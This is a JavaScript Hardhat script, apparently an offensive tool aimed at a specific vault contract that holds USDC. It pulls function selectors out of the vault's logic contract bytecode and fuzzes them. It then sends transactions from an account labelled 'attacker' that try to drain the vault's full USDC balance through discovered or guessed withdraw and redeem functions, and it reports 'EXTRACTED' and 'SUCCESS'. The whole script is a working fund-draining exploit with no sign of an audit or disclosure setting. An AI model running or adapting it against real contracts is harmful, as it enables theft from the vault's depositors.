const { ethers } = require("hardhat");

const LOGIC_ADDRESS = "0x5822122044d43cdd520ee4dac3a10cdab0d868a0";
const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";

/**
 * @title Analyze Logic Contract
 * @notice Deep analysis of the discovered logic contract
 * @dev This is likely where the real withdrawal logic resides
 */
async function main() {
  console.log("\nüéØ ANALYZING LOGIC CONTRACT");
  console.log("=====================================");
  console.log("Logic contract:", LOGIC_ADDRESS);
  
  const [attacker] = await ethers.getSigners();
  const USDC = await ethers.getContractAt("contracts/IERC20.sol:IERC20", USDC_ADDRESS);
  
  // Get contract code
  const logicCode = await ethers.provider.getCode(LOGIC_ADDRESS);
  console.log("Contract size:", logicCode.length / 2 - 1, "bytes");
  
  // Extract all function selectors
  const selectors = extractAllSelectors(logicCode);
  console.log(`Found ${selectors.length} function selectors\n`);
  
  // Get current balances
  const vaultUSDC = await USDC.balanceOf(VAULT_ADDRESS);
  console.log("Vault USDC:", ethers.formatUnits(vaultUSDC, 6));
  
  // Test each selector on the logic contract directly
  console.log("\nüîç Testing selectors on logic contract:");
  
  const successfulSelectors = [];
  
  for (const selector of selectors) {
    process.stdout.write(`Testing ${selector}: `);
    
    // Test as view function
    try {
      const result = await attacker.call({
        to: LOGIC_ADDRESS,
        data: selector
      });
      
      if (result && result !== "0x") {
        process.stdout.write(`VIEW(${result.slice(0, 10)}...) `);
        successfulSelectors.push({ selector, type: "view", result });
      }
    } catch (e) {}
    
    // Test with common parameters
    const tests = [
      { name: "token", data: selector + ethers.AbiCoder.defaultAbiCoder().encode(["address"], [USDC_ADDRESS]).slice(2) },
      { name: "amount", data: selector + ethers.AbiCoder.defaultAbiCoder().encode(["uint256"], [ethers.parseUnits("100", 6)]).slice(2) },
      { name: "token+amount", data: selector + ethers.AbiCoder.defaultAbiCoder().encode(["address", "uint256"], [USDC_ADDRESS, ethers.parseUnits("100", 6)]).slice(2) },
      { name: "recipient", data: selector + ethers.AbiCoder.defaultAbiCoder().encode(["address"], [attacker.address]).slice(2) }
    ];
    
    for (const test of tests) {
      try {
        const result = await attacker.call({
          to: LOGIC_ADDRESS,
          data: test.data
        });
        
        if (result && result !== "0x") {
          process.stdout.write(`${test.name}:OK `);
          successfulSelectors.push({ selector, type: test.name, result });
        }
      } catch (e) {}
    }
    
    console.log();
  }
  
  // Now test successful selectors through the vault
  console.log("\nüí∞ Testing successful selectors through vault:");
  
  for (const item of successfulSelectors) {
    console.log(`\nTesting ${item.selector} (${item.type}):`);
    
    // Build appropriate calldata based on type
    let calldata = item.selector;
    
    if (item.type === "token") {
      calldata += ethers.AbiCoder.defaultAbiCoder().encode(["address"], [USDC_ADDRESS]).slice(2);
    } else if (item.type === "amount") {
      calldata += ethers.AbiCoder.defaultAbiCoder().encode(["uint256"], [vaultUSDC]).slice(2);
    } else if (item.type === "token+amount") {
      calldata += ethers.AbiCoder.defaultAbiCoder().encode(["address", "uint256"], [USDC_ADDRESS, vaultUSDC]).slice(2);
    } else if (item.type === "recipient") {
      calldata += ethers.AbiCoder.defaultAbiCoder().encode(["address"], [attacker.address]).slice(2);
    }
    
    try {
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: calldata,
        gasLimit: 500000
      });
      await tx.wait();
      console.log("‚úÖ Transaction succeeded");
      
      // Check if USDC moved
      const newVaultUSDC = await USDC.balanceOf(VAULT_ADDRESS);
      const attackerUSDC = await USDC.balanceOf(attacker.address);
      
      if (newVaultUSDC < vaultUSDC) {
        console.log(`üéâ USDC EXTRACTED: ${ethers.formatUnits(vaultUSDC - newVaultUSDC, 6)}`);
        console.log(`Attacker balance: ${ethers.formatUnits(attackerUSDC, 6)}`);
        
        // Try to get remaining
        if (newVaultUSDC > 0n) {
          let calldata2 = item.selector;
          if (item.type.includes("amount")) {
            calldata2 = item.selector + ethers.AbiCoder.defaultAbiCoder().encode(
              item.type === "token+amount" ? ["address", "uint256"] : ["uint256"],
              item.type === "token+amount" ? [USDC_ADDRESS, newVaultUSDC] : [newVaultUSDC]
            ).slice(2);
          }
          
          const tx2 = await attacker.sendTransaction({
            to: VAULT_ADDRESS,
            data: calldata2,
            gasLimit: 500000
          });
          await tx2.wait();
          console.log("‚úÖ Second extraction attempted");
        }
        
        break;
      }
    } catch (e) {
      console.log("‚ùå Failed:", e.reason || "Unknown error");
    }
  }
  
  // Try direct interaction patterns
  console.log("\nüîß Testing direct withdrawal patterns:");
  
  const withdrawalPatterns = [
    {
      name: "withdraw(address,uint256)",
      selector: "0xf3fef3a3",
      params: [USDC_ADDRESS, vaultUSDC]
    },
    {
      name: "withdrawToken(address,uint256)",
      selector: "0x9e281a98",
      params: [USDC_ADDRESS, vaultUSDC]
    },
    {
      name: "withdraw(uint256)",
      selector: "0x2e1a7d4d",
      params: [vaultUSDC]
    },
    {
      name: "redeem(uint256)",
      selector: "0xdb006a75",
      params: [vaultUSDC]
    }
  ];
  
  for (const pattern of withdrawalPatterns) {
    try {
      console.log(`\nTesting ${pattern.name}:`);
      
      const data = pattern.selector + ethers.AbiCoder.defaultAbiCoder().encode(
        pattern.params.length === 2 ? ["address", "uint256"] : ["uint256"],
        pattern.params
      ).slice(2);
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: data,
        gasLimit: 500000
      });
      await tx.wait();
      console.log("‚úÖ Transaction succeeded");
      
      // Check balance
      const newBalance = await USDC.balanceOf(VAULT_ADDRESS);
      if (newBalance < vaultUSDC) {
        console.log(`üí∞ USDC moved: ${ethers.formatUnits(vaultUSDC - newBalance, 6)}`);
      }
    } catch (e) {
      console.log("‚ùå Failed");
    }
  }
  
  // Final balance check
  const finalVaultUSDC = await USDC.balanceOf(VAULT_ADDRESS);
  const finalAttackerUSDC = await USDC.balanceOf(attacker.address);
  
  console.log("\nüìä FINAL STATE:");
  console.log("Vault USDC:", ethers.formatUnits(finalVaultUSDC, 6));
  console.log("Attacker USDC:", ethers.formatUnits(finalAttackerUSDC, 6));
  
  if (finalVaultUSDC < vaultUSDC) {
    console.log("\nüèÜ SUCCESS! Extracted:", ethers.formatUnits(vaultUSDC - finalVaultUSDC, 6), "USDC");
  }
}

function extractAllSelectors(bytecode) {
  const selectors = new Set();
  
  // Multiple patterns
  const patterns = [
    /63([0-9a-f]{8})/g,
    /8063([0-9a-f]{8})/g,
    /7c01([0-9a-f]{8})/g
  ];
  
  patterns.forEach(pattern => {
    let match;
    while ((match = pattern.exec(bytecode)) !== null) {
      if (match[1]) {
        selectors.add("0x" + match[1]);
      }
    }
  });
  
  return Array.from(selectors);
}

main().catch((error) => {
  console.error("\nüí• Script error:", error);
  process.exit(1);
});
